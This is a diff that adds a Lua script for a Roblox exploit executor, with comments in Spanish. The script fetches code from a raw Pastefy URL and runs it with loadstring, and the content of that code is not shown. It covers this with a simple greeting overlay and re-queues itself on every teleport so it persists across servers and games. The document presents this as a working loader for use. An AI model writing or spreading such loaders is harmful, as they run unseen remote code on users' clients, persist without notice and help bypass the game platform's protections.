@@ -1,0 +1,51 @@
+local scriptACorrer = [[
+    -- Contador por servidor/partida
+    getgenv().ejecucionesEnPartida = (getgenv().ejecucionesEnPartida or 0) + 1
+
+    -- Si ya se ejecutó 2 veces en ESTA misma partida, ignoramos las siguientes
+    if getgenv().ejecucionesEnPartida <= 2 then
+        task.wait(1.5)
+
+        -- 1. Cargar script de Pastefy
+        task.spawn(function()
+            pcall(function()
+                loadstring(game:HttpGet("https://pastefy.app/nyvzvdtF/raw"))()
+            end)
+        end)
+
+        -- 2. Mostrar la interfaz
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+        local playerGui = player:WaitForChild("PlayerGui")
+
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "HolaGui_" .. tostring(getgenv().ejecucionesEnPartida)
+        screenGui.ResetOnSpawn = false
+        screenGui.Parent = playerGui
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(0, 320, 0, 80)
+        textLabel.Position = UDim2.new(0.5, -160, 0.2, 0)
+        textLabel.BackgroundTransparency = 0.3
+        textLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        textLabel.TextSize = 32
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.Text = "¡Hola! (" .. getgenv().ejecucionesEnPartida .. "/2)"
+        textLabel.Parent = screenGui
+
+        local uiCorner = Instance.new("UICorner")
+        uiCorner.CornerRadius = UDim.new(0, 10)
+        uiCorner.Parent = textLabel
+    end
+
+    -- Siempre registramos la cola para el SIGUIENTE juego o servidor
+    local teleportQueue = queue_on_teleport or (syn and syn.queue_on_teleport)
+    if teleportQueue then
+        teleportQueue(getgenv().scriptOriginal)
+    end
+]]
+
+getgenv().scriptOriginal = scriptACorrer
+loadstring(scriptACorrer)()
+
